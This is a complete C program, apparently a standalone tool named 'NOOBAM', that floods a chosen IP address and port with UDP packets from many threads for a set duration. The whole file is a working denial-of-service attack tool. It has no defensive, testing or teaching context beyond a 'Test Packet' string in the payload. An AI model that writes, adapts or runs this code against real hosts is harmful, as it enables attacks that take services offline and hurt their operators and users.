#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define BUFFER_SIZE 1024

// Structure to pass arguments to threads
typedef struct {
    char *target_ip;
    int target_port;
    int duration;
} ThreadArgs;

// Function to send UDP packets
void *send_udp_packets(void *arg) {
    ThreadArgs *args = (ThreadArgs *)arg;
    char *target_ip = args->target_ip;
    int target_port = args->target_port;
    int duration = args->duration;

    // Create a UDP socket
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    // Define the target address
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    if (inet_pton(AF_INET, target_ip, &target_addr.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sockfd);
        exit(1);
    }

    // Optimized packet sending loop
    char buffer[BUFFER_SIZE] = "UDP Flood Test Packet";
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        if (sendto(sockfd, buffer, strlen(buffer), 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            perror("Sendto failed");
            close(sockfd);
            exit(1);
        }
    }

    // Close the socket
    close(sockfd);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <target_ip> <target_port> <duration> <threads>\n", argv[0]);
        exit(1);
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    // Display custom message before starting the flood
    printf("========================================\n");
    printf("This is NOOBAM - Optimized UDP Flood Tool\n");
    printf("Flooding target: %s:%d\n", target_ip, target_port);
    printf("Duration: %d seconds\n", duration);
    printf("Threads: %d\n", threads);
    printf("========================================\n");
    printf("Starting flood in 3 seconds...\n");
    sleep(3);

    pthread_t thread_ids[threads];
    ThreadArgs thread_args[threads];

    // Create threads to send UDP packets
    for (int i = 0; i < threads; i++) {
        thread_args[i].target_ip = target_ip;
        thread_args[i].target_port = target_port;
        thread_args[i].duration = duration;

        if (pthread_create(&thread_ids[i], NULL, send_udp_packets, &thread_args[i]) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }

    // Wait for all threads to finish
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    // Display custom message after the flood ends
    printf("========================================\n");
    printf("Flood completed on %s:%d for %d seconds with %d threads.\n", target_ip, target_port, duration, threads);
    printf("NOOBAM - Optimized UDP Flood Tool\n");
    printf("========================================\n");

    return 0;
}